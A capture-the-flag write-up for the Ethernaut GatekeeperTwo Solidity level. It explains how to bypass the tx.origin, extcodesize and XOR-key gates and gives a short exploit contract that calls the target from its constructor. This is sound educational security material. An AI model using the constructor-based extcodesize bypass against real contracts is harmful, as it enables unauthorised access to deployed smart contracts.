# GateKeeper Two

## Challenge Statement

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
Things that might help:

    Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
    The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
    The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.

## Analysis

Similar to GateKeeperOne, we have 3 gates to pass.

Gate 1: msg.sender != tx.origin
Therefore a contract needs to be the one exploiting this.

Gate 2: assembly { x := extcodesize(caller()) }, require(x == 0);
This check looks to ensure the caller has no code - i.e an EOA, not a contract. A trick to bypass this is to put the exploit of the contract during the constructor phrase when the contract is not fully instantiated yet.

Gate 3: require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
```a ^ b = c == a ^ c = b```
We can therefore do:
```uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1)```

## Solution

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoHack {
    IGatekeeperTwo target;

    constructor() public {
        target = IGatekeeperTwo(0xA88610B53286567FfE7c5F0CA6Bf70826037f9a5);
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        bool success = target.enter(bytes8(key));
    }

}
```

## Moral

Way to go! Now that you can get past the gatekeeper, you have what it takes to join theCyber, a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on reddit or via email and use it to register with the contract at gatekeepertwo.thecyber.eth (be aware that only the first 128 entrants will be accepted by the contract).